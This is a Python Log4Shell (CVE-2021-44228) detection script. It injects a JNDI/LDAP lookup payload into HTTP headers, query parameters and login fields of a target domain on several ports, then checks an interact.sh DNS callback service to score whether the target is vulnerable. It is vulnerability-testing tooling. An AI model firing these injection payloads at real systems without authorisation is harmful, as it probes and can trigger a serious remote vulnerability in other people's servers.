#!/usr/bin/env python3
# coding=utf-8
import argparse
import random
import requests
import time
import sys
from urllib import parse as urlparse
import base64
import json
from uuid import uuid4
from base64 import b64encode
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Hash import SHA256

#Disable SSL warnings
try:
    import requests.packages.urllib3
    requests.packages.urllib3.disable_warnings()
except Exception:
    pass


if len(sys.argv) <= 1:
    exit(0)


default_headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
    'Accept': '*/*'
}

post_data_parameters = ["username", "user", "uname", "name", "email", "email_address", "password"]
timeout = 4

parser = argparse.ArgumentParser(description="simple Log4J test (CVE-2021-44228)")
parser.add_argument("domain", help="Check a single Domain.")
args = parser.parse_args()

args = parser.parse_args()

#vars
sec=5
request_type="GET"
proxies={}
headers_file="headers.txt"
dns_callback_provider="interact.sh"



def getFuzzingHeaders(payload):
    """Look up Fuzzing Header

    Args:
        payload (string): payload

    Returns:
        fuzzing_headers: gevonden headers
    """
    fuzzing_headers = {}
    fuzzing_headers.update(default_headers)
    with open(headers_file, "r") as f:
        for i in f.readlines():
            i = i.strip()
            if i == "" or i.startswith("#"):
                continue
            fuzzing_headers.update({i: payload})

    if "Referer" in fuzzing_headers:
        fuzzing_headers["Referer"] = f'https://{fuzzing_headers["Referer"]}'
    return fuzzing_headers


def getFuzzingPostData(payload):
    """Search fields to post fuzzing data

    Args:
        payload (string): payload

    Returns:
        postdata: sended data
    """
    fuzzing_post_data = {}
    for i in post_data_parameters:
        fuzzing_post_data.update({i: payload})
    return fuzzing_post_data
class Interactsh:
    """Class Interactsh
    """

    def __init__(self, token="", server=""):

        """connection to server

        Args:
            token (str, optional): session token. Defaults to "".
            server (str, optional): name of the server. Defaults to "".
        """
        rsa = RSA.generate(2048)
        self.publicKey = rsa.publickey().exportKey()
        self.privateKey = rsa.exportKey()
        self.token = token
        self.server = server.lstrip('.') or 'interact.sh'
        self.headers = {
            "Content-Type": "application/json",
        }
        if self.token:
            self.headers['Authorization'] = self.token
        self.secret = str(uuid4())
        self.encoded = b64encode(self.publicKey).decode("utf8")
        guid = uuid4().hex.ljust(33, 'a')
        guid = ''.join(i if i.isdigit() else chr(ord(i) + random.randint(0, 20)) for i in guid)
        self.domain = f'{guid}.{self.server}'
        self.correlationId = self.domain[:20]

        self.session = requests.session()
        self.session.headers = self.headers
        self.session.verify = False
        self.session.proxies = proxies
        self.register()

    def register(self):
        """register

        Raises:
            Exception: if server is unreachable
        """

        data = {
            "public-key": self.encoded,
            "secret-key": self.secret,
            "correlation-id": self.correlationId
        }
        res = self.session.post(
            f"https://{self.server}/register", headers=self.headers, json=data, timeout=30)
        if 'success' not in res.text:
            raise Exception("Can not initiate interact.sh DNS callback client")

    def pullLogs(self):
        """pull logs from the server

        Returns:
            result: list of results
        """

        result = []
        url = f"https://{self.server}/poll?id={self.correlationId}&secret={self.secret}"
        res = self.session.get(url, headers=self.headers, timeout=30).json()
        aesKey, data_list = res['aes_key'], res['data']
        for i in data_list:
            decrypt_data = self.decryptData(aesKey, i)
            result.append(self.parseLog(decrypt_data))
        return result

    def decryptData(self, aesKey, data):
        """try to decrypt data

        Args:
            aes_key (string): decryption key
            data (string): response data

        Returns:
           json: plaint text
        """

        privateKey = RSA.importKey(self.privateKey)
        cipher = PKCS1_OAEP.new(privateKey, hashAlgo=SHA256)
        aes_plain_key = cipher.decrypt(base64.b64decode(aesKey))
        decode = base64.b64decode(data)
        bs = AES.block_size
        iv = decode[:bs]
        cryptor = AES.new(key=aes_plain_key, mode=AES.MODE_CFB, IV=iv, segment_size=128)
        plain_text = cryptor.decrypt(decode)
        return json.loads(plain_text[16:])

    def parseLog(self, logEntry):
        """Convert log to correct format

        Args:
            logEntry (string): raw text

        Returns:
            new_log_entry: correct format of logs
        """

        new_log_entry = {"timestamp": logEntry["timestamp"],
                         "host": f'{logEntry["full-id"]}.{self.domain}',
                         "remote_address": logEntry["remote-address"]
                         }
        return new_log_entry
#urlparser
def parseUrl(url):
    """
    Parses the URL.
    """
    url = url.replace('#', '%23')
    url = url.replace(' ', '%20')

    scheme = urlparse.urlparse(url).scheme

    # FilePath: /login.jsp
    file_path = urlparse.urlparse(url).path
    if (file_path == ''):
        file_path = '/'

    return({"scheme": scheme,
            "site": f"{scheme}://{urlparse.urlparse(url).netloc}",
            "host":  urlparse.urlparse(url).netloc.split(":")[0],
            "file_path": file_path})


def scanUrl(url, callbackHost):
    """Scan url for vulnability

    Args:
        url (string): target url
        callbackHost (string): callback host
    """
    parsed_url = parseUrl(url)
    random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(7))
    payload = '${jndi:ldap://%s.%s/%s}' % (parsed_url["host"], callbackHost, random_string)
    payloads = [payload]


    for payload in payloads:
        if request_type.upper() == "GET":
            try:
                requests.request(url=url,
                                 method="GET",
                                 params={"v": payload},
                                 headers=getFuzzingHeaders(payload),
                                 verify=False,
                                 timeout=timeout,
                                 allow_redirects=False,
                                 proxies=proxies)
            except:
                pass

            try:
                requests.request(url=url,
                                 method="POST",
                                 params={"v": payload},
                                 headers=getFuzzingHeaders(payload),
                                 json=getFuzzingPostData(payload),
                                 verify=False,
                                 timeout=timeout,
                                 allow_redirects=False,
                                 proxies=proxies)
            except:
                pass


def main():
    """main function
    """
    url= "https://"+args.domain
    urls = []
    ports=["80","8080","443","8081"]
    for port in ports:
        urls.append(url+":"+port)
    dns_callback_host = ""
    dns_callback = Interactsh()
    dns_callback_host = dns_callback.domain
    for url in urls:
        scanUrl(url, dns_callback_host)
#result
    result={}
    time.sleep(sec)
    records = dns_callback.pullLogs()
    if len(records) == 0:
        result={"name":"Log4J check","score":-1}
    else:
        result={"name":"Log4J check","score":0}

    jsonresult = json.dumps(result)
    print(jsonresult)
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        exit(0)
